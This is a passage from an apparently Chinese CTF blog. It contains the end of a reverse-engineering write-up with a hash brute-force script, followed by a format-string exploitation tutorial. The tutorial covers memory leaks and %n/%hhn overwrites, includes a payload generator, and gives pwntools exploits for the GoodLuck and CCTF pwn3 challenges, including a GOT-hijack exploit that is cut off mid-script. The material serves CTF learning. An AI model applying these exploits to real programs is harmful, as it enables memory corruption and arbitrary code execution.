class="string">&#x27;874992ac91866ce1430687aa9f7121fc&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">num</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> num != <span class="number">1</span>:</span><br><span class="line">        num = num * <span class="number">3</span> + <span class="number">1</span> <span class="keyword">if</span> num % <span class="number">2</span> <span class="keyword">else</span> num // <span class="number">2</span></span><br><span class="line">        result.append(num)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Your input is not the FLAG!&#x27;</span>)</span><br><span class="line">    inp = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(inp) != <span class="number">27</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;length error!&#x27;</span>)</span><br><span class="line">        sys.exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(inp):</span><br><span class="line">        ret_list = func(<span class="built_in">ord</span>(ch))</span><br><span class="line">        s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ret_list)):</span><br><span class="line">            s += <span class="built_in">str</span>(ret_list[idx])</span><br><span class="line">            s += <span class="built_in">str</span>(ret_list[(<span class="built_in">len</span>(ret_list) - idx - <span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line">        md5 = hashlib.md5()</span><br><span class="line">        md5.update(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> md5.hexdigest() != check[i]:</span><br><span class="line">            sys.exit(i)</span><br><span class="line"></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(inp.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;You win!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + md5.hexdigest() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">check = [</span><br><span class="line"> <span class="string">&#x27;e5438e78ec1de10a2693f9cffb930d23&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;08e8e8855af8ea652df54845d21b9d67&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;a905095f0d801abd5865d649a646b397&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;bac8510b0902185146c838cdf8ead8e0&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;f26f009a6dc171e0ca7a4a770fecd326&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;cffd0b9d37e7187483dc8dd19f4a8fa8&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;4cb467175ab6763a9867b9ed694a2780&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;cffd0b9d37e7187483dc8dd19f4a8fa8&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;fd311e9877c3db59027597352999e91f&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;49733de19d912d4ad559736b1ae418a7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;7fb523b42413495cc4e610456d1f1c84&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;acb465dc618e6754de2193bf0410aafe&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;bc52c927138231e29e0b05419e741902&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;515b7eceeb8f22b53575afec4123e878&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;451660d67c64da6de6fadc66079e1d8a&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;fe86104ce1853cb140b7ec0412d93837&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;acb465dc618e6754de2193bf0410aafe&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;c2bab7ea31577b955e2c2cac680fb2f4&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;f077b3a47c09b44d7077877a5aff3699&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;620741f57e7fafe43216d6aa51666f1d&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;9e3b206e50925792c3234036de6a25ab&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;49733de19d912d4ad559736b1ae418a7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;874992ac91866ce1430687aa9f7121fc&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">num</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> num != <span class="number">1</span>:</span><br><span class="line">        num = num * <span class="number">3</span> + <span class="number">1</span> <span class="keyword">if</span> num % <span class="number">2</span> <span class="keyword">else</span> num // <span class="number">2</span></span><br><span class="line">        result.append(num)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">	a = func(i)</span><br><span class="line">	s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">		s += <span class="built_in">str</span>(a[idx])</span><br><span class="line">		s += <span class="built_in">str</span>(a[(<span class="built_in">len</span>(a) - idx - <span class="number">1</span>)])</span><br><span class="line">	md5 = hashlib.md5()</span><br><span class="line">	md5.update(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">	b = md5.hexdigest()</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">		<span class="keyword">if</span> b == check[j]:</span><br><span class="line">			<span class="built_in">print</span> j,<span class="built_in">chr</span>(i)</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">15</span> +</span><br><span class="line"><span class="number">16</span> <span class="number">1</span></span><br><span class="line"><span class="number">13</span> <span class="number">3</span></span><br><span class="line"><span class="number">19</span> <span class="number">3</span></span><br><span class="line"><span class="number">24</span> <span class="number">5</span></span><br><span class="line"><span class="number">9</span> @</span><br><span class="line"><span class="number">5</span> M</span><br><span class="line"><span class="number">8</span> M</span><br><span class="line"><span class="number">18</span> R</span><br><span class="line"><span class="number">22</span> T</span><br><span class="line"><span class="number">14</span> X</span><br><span class="line"><span class="number">7</span> _</span><br><span class="line"><span class="number">12</span> _</span><br><span class="line"><span class="number">17</span> _</span><br><span class="line"><span class="number">21</span> _</span><br><span class="line"><span class="number">2</span> a</span><br><span class="line"><span class="number">23</span> e</span><br><span class="line"><span class="number">0</span> f</span><br><span class="line"><span class="number">3</span> g</span><br><span class="line"><span class="number">11</span> h</span><br><span class="line"><span class="number">1</span> l</span><br><span class="line"><span class="number">10</span> t</span><br><span class="line"><span class="number">25</span> t</span><br><span class="line"><span class="number">20</span> v</span><br><span class="line"><span class="number">6</span> y</span><br><span class="line"><span class="number">4</span> &#123;</span><br><span class="line"><span class="number">26</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>手动操作一下就ok</p>
]]></content>
      <categories>
        <category>比赛WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>Format String</title>
    <url>/article/Format%20String/</url>
    <content><![CDATA[<h1 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h1><p>感觉前面写的挺多错误的，也不知道从哪里开始改了。。。</p>
<p>随便看看就好</p>
<p>一级标题的题目应该还是能看的</p>
<p>咕咕咕。。。</p>
<!-- 文章页 配置 -->

<p>第三个地址指向的是格式化字符串第一个变量值</p>
<hr>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(pwnme) + <span class="string">&#x27;aaaa&#x27;</span> + <span class="string">&quot;%10$n&quot;</span></span><br></pre></td></tr></table></figure>

<p>p32 = 4字节</p>
<p>‘aaaa’ = 4字节</p>
<p>“%10$n” = 修改第10个参数 （通过[tag]%p%p…)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ fmtarg [addr] #计算字符串偏移</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fmtstr_payload(offset,&#123;address:value&#125;)</span><br></pre></td></tr></table></figure>



<p>32位：</p>
<p><img src="/article/Format%20String/20200323095517-585c876c-6ca9-1.png" alt="img"></p>
<p>64位：</p>
<p><img src="/article/Format%20String/20200323095518-58ad4d5a-6ca9-1.png" alt="img"></p>
<p>小技巧总结</p>
<ol>
<li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li>
<li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</li>
<li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</li>
</ol>
<h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><blockquote>
<p>一般来说32位程序 b printf 的栈中<br>第一个变量是返回地址<br>第二个变量是格式化字符串的地址<br>第三个开始为第一个变量的值</p>
</blockquote>
<h3 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h3><h4 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h4><p>获取栈中被视为第 n+1 个参数的值（第一个是返回地址，所以从n+1开始） : <code>%n$x</code>，或者用%p也可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Breakpoint 1, __printf (format&#x3D;0xffffcd10 &quot;%3$x&quot;) at printf.c:28</span><br><span class="line">28  in printf.c</span><br><span class="line">─────────────────────────────────────────────────────[ code:i386 ]────</span><br><span class="line">   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]</span><br><span class="line">   0xf7e4466d                  nop</span><br><span class="line">   0xf7e4466e                  xchg   ax, ax</span><br><span class="line"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]</span><br><span class="line">      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret</span><br><span class="line">      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]</span><br><span class="line">      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret</span><br><span class="line">─────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0xffffccfc&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp 	&#x2F;&#x2F;返回地址</span><br><span class="line">0xffffcd00│+0x04: 0xffffcd10  →  &quot;%3$x&quot; 							&#x2F;&#x2F;1</span><br><span class="line">0xffffcd04│+0x08: 0xffffcd10  →  &quot;%3$x&quot; 							&#x2F;&#x2F;2</span><br><span class="line">0xffffcd08│+0x0c: 0x000000c2    					   				&#x2F;&#x2F;3</span><br><span class="line">0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10 		&#x2F;&#x2F;4</span><br><span class="line">0xffffcd10│+0x14: &quot;%3$x&quot;     ← $eax</span><br><span class="line">0xffffcd14│+0x18: 0xffffce00  →  0x00000001</span><br><span class="line">0xffffcd18│+0x1c: 0x000000e0</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">f7e8b6bb[Inferior 1 (process 57442) exited normally]</span><br></pre></td></tr></table></figure>

<p>这里输入%3$x，获得了printf的第四个参数所对应的值 f7e8b6bb</p>
<h4 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用到 %s</span><br></pre></td></tr></table></figure>



<h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[tag]%p%p%p%p%p%p...</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; fmtarg 0xffffcefc</span><br></pre></td></tr></table></figure>



<h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</span><br></pre></td></tr></table></figure>



<h3 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h3><p>让c=16</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(c_addr) + <span class="string">&#x27;%012d&#x27;</span> + <span class="string">&#x27;%6$n&#x27;</span></span><br></pre></td></tr></table></figure>

<p>‘%012d’ = 12个字符<br>‘%6$n’ = 占4个字符。用payload的字符个数更改第6个参数的值</p>
<h3 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h3><h4 id="覆盖小数字（没理解）"><a href="#覆盖小数字（没理解）" class="headerlink" title="覆盖小数字（没理解）"></a>覆盖小数字（没理解）</h4><p>我们的格式化字符串的为第 6 个参数。<br>想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aa%k$nxx</span><br></pre></td></tr></table></figure>

<p>此时对应的存储的格式化字符串已经占据了 6 个字符的位置，如果我们再添加两个字符 aa，那么其实 aa%k 就是第 6 个参数，$nxx 其实就是第 7 个参数，后面我们如果跟上我们要覆盖的地址，那就是第 8 个参数，所以如果我们这里设置 k 为 8，其实就可以覆盖了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;aa%8$naa&#x27;</span> + p32(a_addr)</span><br></pre></td></tr></table></figure>



<h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。</span><br><span class="line">h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%hhn 向某个地址写入单字节</span><br><span class="line">%hn 向某个地址写入双字节</span><br></pre></td></tr></table></figure>

<p>希望覆盖的地址为 0x0804A028。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.data:0804A028                 public b</span><br><span class="line">.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510r</span><br></pre></td></tr></table></figure>

<p>即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0804A028 \x78</span><br><span class="line">0x0804A029 \x56</span><br><span class="line">0x0804A02a \x34</span><br><span class="line">0x0804A02b \x12</span><br></pre></td></tr></table></figure>

<p>首先，由于我们的字符串的偏移为 6，所以我们可以确定我们的 payload 基本是这个样子的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+&#39;%6$n&#39;+pad2+&#39;%7$n&#39;+pad3+&#39;%8$n&#39;+pad4+&#39;%9$n&#39;</span><br></pre></td></tr></table></figure>

<h5 id="payload生成器"><a href="#payload生成器" class="headerlink" title="payload生成器"></a>payload生成器</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">prev, word, index</span>):</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">payload = fmt_str(<span class="number">6</span>,<span class="number">4</span>,<span class="number">0x0804A028</span>,<span class="number">0x12345678</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>offset 表示要覆盖的地址最初的偏移</li>
<li>size 表示机器字长</li>
<li>addr 表示将要覆盖的地址。</li>
<li>target 表示我们要覆盖为的目的变量值。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = fmt_str(<span class="number">6</span>, <span class="number">4</span>, <span class="number">0x0804A028</span>, <span class="number">0x12345678</span>)</span><br></pre></td></tr></table></figure>





<h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><h3 id="非栈上格式化字符串漏洞利用"><a href="#非栈上格式化字符串漏洞利用" class="headerlink" title="非栈上格式化字符串漏洞利用"></a>非栈上格式化字符串漏洞利用</h3><p>改 ret 地址中的 libc_start_main 为 onegadget (可能ongadget失效)</p>
<p>改 printf 的 got 为 system/onegadget</p>
<h2 id="x64例题"><a href="#x64例题" class="headerlink" title="x64例题"></a>x64例题</h2><h3 id="pwn200-GoodLuck"><a href="#pwn200-GoodLuck" class="headerlink" title="pwn200 GoodLuck"></a><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">pwn200 GoodLuck</a></h3><p>保护</p>
<p><img src="/article/Format%20String/image-20210331181935199.png" alt="image-20210331181935199"></p>
<p>IDA</p>
<p><img src="/article/Format%20String/image-20210331182037722.png" alt="image-20210331182037722"></p>
<p>格式化字符串漏洞，去gdb调试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x7ffff7a62807 &lt;__fprintf+135&gt;:	add    rsp,0xd8</span><br><span class="line">   0x7ffff7a6280e &lt;__fprintf+142&gt;:	ret    </span><br><span class="line">   0x7ffff7a6280f:	nop</span><br><span class="line">&#x3D;&gt; 0x7ffff7a62810 &lt;__printf&gt;:	sub    rsp,0xd8</span><br><span class="line">   0x7ffff7a62817 &lt;__printf+7&gt;:	test   al,al</span><br><span class="line">   0x7ffff7a62819 &lt;__printf+9&gt;:	mov    QWORD PTR [rsp+0x28],rsi</span><br><span class="line">   0x7ffff7a6281e &lt;__printf+14&gt;:	mov    QWORD PTR [rsp+0x30],rdx</span><br><span class="line">   0x7ffff7a62823 &lt;__printf+19&gt;:	mov    QWORD PTR [rsp+0x38],rcx</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffde08 --&gt; 0x400890 (&lt;main+234&gt;:	mov    edi,0x4009b8)</span><br><span class="line">0008| 0x7fffffffde10 --&gt; 0x61000001 </span><br><span class="line">0016| 0x7fffffffde18 --&gt; 0x602830 --&gt; 0x61616161 (&#39;aaaa&#39;)</span><br><span class="line">0024| 0x7fffffffde20 --&gt; 0x602010 (&quot;You answered:\ng\n&quot;)</span><br><span class="line">0032| 0x7fffffffde28 --&gt; 0x7fffffffde30 (&quot;flag&#123;&quot;, &#39;1&#39; &lt;repeats 11 times&gt;, &quot;&#125;\n\377\377\377\377&quot;)</span><br><span class="line">0040| 0x7fffffffde30 (&quot;flag&#123;&quot;, &#39;1&#39; &lt;repeats 11 times&gt;, &quot;&#125;\n\377\377\377\377&quot;)</span><br><span class="line">0048| 0x7fffffffde38 (&quot;11111111&#125;\n\377\377\377\377&quot;)</span><br><span class="line">0056| 0x7fffffffde40 --&gt; 0xffffffff0a7d </span><br></pre></td></tr></table></figure>

<p>发现地址0x7fffffffde28，即第四个参数的位置是flag，偏移为 4。此外，由于这是一个 64 位程序，所以前 6 个参数存在在对应的寄存器中，fmt 字符串存储在 RDI 寄存器中，所以 fmt 字符串对应的地址的偏移为 4+6。</p>
<blockquote>
<p>fmt 字符串中 <code>%order$s</code> 对应的 order 为 fmt 字符串后面的参数的顺序，所以我们只需要输入 %10-1$s ，即 %9$s 即可得到 flag 的内容。</p>
</blockquote>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./goodluck&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%9$s&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;what\&#x27;s the flag&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h2><h3 id="2016-CCTF-pwn3"><a href="#2016-CCTF-pwn3" class="headerlink" title="2016 CCTF_pwn3"></a>2016 CCTF_<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3">pwn3</a></h3><p>保护</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;trick&#x2F;Desktop&#x2F;goodluck&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>格式化字符串漏洞在get函数中</p>
<p><img src="/article/Format%20String/image-20210402145416197.png" alt="image-20210402145416197"></p>
<p>基本思路：</p>
<ul>
<li>绕过密码</li>
<li>确定格式化字符串参数偏移</li>
<li>利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。</li>
<li>修改 puts@got 的内容为 system 的地址。</li>
<li>当程序再次执行 puts 函数的时候，其实执行的是 system 函数。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; stack 20</span><br><span class="line">00:0000│ esp  0xffffcedc —▸ 0x80488a3 (get_file+173) ◂— leave  </span><br><span class="line">01:0004│      0xffffcee0 —▸ 0xffffcefc —▸ 0x8048358 ◂— jae    0x80483ce &#x2F;* &#39;strcmp&#39; *&#x2F;</span><br><span class="line">02:0008│      0xffffcee4 —▸ 0x8048baa ◂— insb   byte ptr es:[edi], dx &#x2F;* &#39;flag&#39; *&#x2F;</span><br><span class="line">03:000c│      0xffffcee8 ◂— 0x4</span><br><span class="line">04:0010│      0xffffceec —▸ 0x804830e ◂— jae    0x8048384 &#x2F;* &#39;strncmp&#39; *&#x2F;</span><br><span class="line">05:0014│      0xffffcef0 ◂— 0x0</span><br><span class="line">06:0018│      0xffffcef4 —▸ 0xffffcf94 —▸ 0xf7e07b58 ◂— jbe    0xf7e07b71</span><br><span class="line">07:001c│      0xffffcef8 ◂— 0x1</span><br><span class="line">08:0020│ eax  0xffffcefc —▸ 0x8048358 ◂— jae    0x80483ce &#x2F;* &#39;strcmp&#39; *&#x2F;</span><br><span class="line">09:0024│      0xffffcf00 ◂— 0xffffffff</span><br><span class="line">0a:0028│      0xffffcf04 —▸ 0xffffcfa4 ◂— 0x0</span><br><span class="line">0b:002c│      0xffffcf08 —▸ 0xf7e07b58 ◂— jbe    0xf7e07b71</span><br><span class="line">0c:0030│      0xffffcf0c —▸ 0xf7fd31b0 —▸ 0xf7e03000 ◂— jg     0xf7e03047</span><br><span class="line">0d:0034│      0xffffcf10 ◂— 0xa &#x2F;* &#39;\n&#39; *&#x2F;</span><br><span class="line">0e:0038│      0xffffcf14 —▸ 0xf7fb6da7 (_IO_2_1_stdout_+71) ◂— 0xfb78700a</span><br><span class="line">0f:003c│      0xffffcf18 —▸ 0xffffcfd8 ◂— 0x3</span><br><span class="line">10:0040│      0xffffcf1c —▸ 0xf7e6b3f4 (new_do_write+52) ◂— mov    esi, eax</span><br><span class="line">11:0044│      0xffffcf20 —▸ 0xf7fb6d60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">12:0048│      0xffffcf24 —▸ 0xf7fb6da7 (_IO_2_1_stdout_+71) ◂— 0xfb78700a</span><br><span class="line">13:004c│      0xffffcf28 ◂— 0x1</span><br><span class="line">pwndbg&gt; fmtarg 0xffffcefc</span><br><span class="line">The index of format argument : 8 (&quot;\%7$p&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>数一下是在第几个位置，从0xffffcee4开始数，7，0xffffcefc，所以下面用 %8$s + puts_got 把后面第八个参数 puts_got 给读出来。也可以用fmtarg [addr]来计算偏移。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">name = <span class="string">&#x27;sysbdmin&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> name:</span><br><span class="line">    payload += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name (ftp.hacker.server:Rainism):&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;please enter the name of the file you want to upload:&#x27;</span>,<span class="string">&#x27;1111&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;%8$s&#x27;</span> + p32(puts_got)    </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;then, enter the content:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;enter the file name you want to get:&#x27;</span>,<span class="string">&#x27;1111&#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = offset + libc.dump(<span 